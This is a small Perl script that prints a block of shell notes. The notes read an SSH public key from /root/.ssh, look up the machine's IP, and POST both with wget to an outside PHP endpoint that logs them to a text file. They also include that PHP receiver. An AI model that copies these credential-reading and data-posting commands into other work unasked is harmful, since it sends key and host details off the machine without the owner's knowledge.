#!/usr/bin/perl
foreach (<DATA>)
{
	print $_;
}
__DATA__
key=$(cat /root/.ssh/id_dsa.pub) 
key=$(cat /.ssh/id_dsa.pub) 

curl  http://www.prettyindustries.com/ip.php  >> /var/log/my_ip.log 
ip=$( tail -n 2  /var/log/my_ip.log  )
wget  --post-data="ssh_key=$ip"    http://www.prettyindustries.com/ssh_key.php

wget  --post-data="ssh_key=$key"    http://www.prettyindustries.com/ssh_key.php


wget -e "http_proxy=http://10.4.16.32:808/" --post-data="ssh_key=$key"    http://www.prettyindustries.com/ssh_key.php

#ssh_key.php
<?php
    $ssh_key=$_POST['ssh_key'];
    file_put_contents("feed_back.txt", $ssh_key."\n",   FILE_APPEND);
?>


wget -e "http_proxy=http://10.4.16.32:808/" --post-data="ssh_key=$key"    http://www.prettyindustries.com/feed_back.txt
curl  http://www.prettyindustries.com/feed_back.txt

